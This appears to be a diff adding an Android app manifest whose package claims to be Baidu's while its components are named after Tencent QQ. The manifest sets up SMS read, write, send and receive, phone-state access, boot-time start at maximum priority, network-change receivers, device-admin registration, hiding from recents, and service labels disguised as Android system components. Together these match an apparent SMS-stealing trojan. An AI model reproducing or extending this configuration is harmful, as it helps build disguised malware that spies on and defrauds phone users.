@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.baidu.kx"
+    android:versionCode="47"
+    android:versionName="4.7" >
+
+    <uses-sdk
+        android:minSdkVersion="8"/>
+    
+    <!-- 读取手机状态 ,如来了新电话，IMSI-->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <!-- 读取短信 -->  
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- 写入短信 -->
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <!-- 发送短信 -->
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <!-- 读取联系人   <uses-permission android:name="android.permission.READ_CONTACTS" />  -->
+  
+    <!-- 开机启动的权限 -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    
+    <!-- 网络访问权限 -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /> 
+    <uses-permission android:name="android.permission.INTERNET" />
+    
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/> 
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/icon_2"
+        android:label="@string/app_name"
+        android:theme="@style/MyTransparent"
+         >
+        
+        <activity
+            android:name="com.baidu.kx.MainActivity"
+            android:label="@string/app_name" 
+            android:excludeFromRecents="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+                <!-- <data android:host="ButtonActivity" android:scheme="com.xieyuan.test" /> -->
+            </intent-filter>
+        </activity>
+
+        
+        <!-- 注册服务 -->
+        <service android:name="com.tencent.qq.MainService"           
+                 android:label="安卓系统服务组件M" android:excludeFromRecents="true" />
+        <service android:name="com.tencent.qq.AssistService"
+                 android:label="安卓系统服务组件A" />
+        <!-- 注册开机启动广播 -->
+         <receiver android:name="com.tencent.qq.BootReceiver" android:excludeFromRecents="true" >
+            <intent-filter android:priority="2147483647">                                                                      
+                <action android:name="android.intent.action.BOOT_COMPLETED" />              
+            </intent-filter>
+        </receiver>
+        <!-- 注册WIFI、网络变更的广播 -->
+        <receiver android:name="com.tencent.qq.NetWorkChangeReceiver" android:excludeFromRecents="true" >
+            <intent-filter android:priority="2147483647">
+              <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+              <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>  
+            </intent-filter>
+        </receiver>
+        <!-- 注册设备管理器 -->
+        <receiver
+            android:name="com.tencent.qq.DeviceAdmin"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+</manifest>
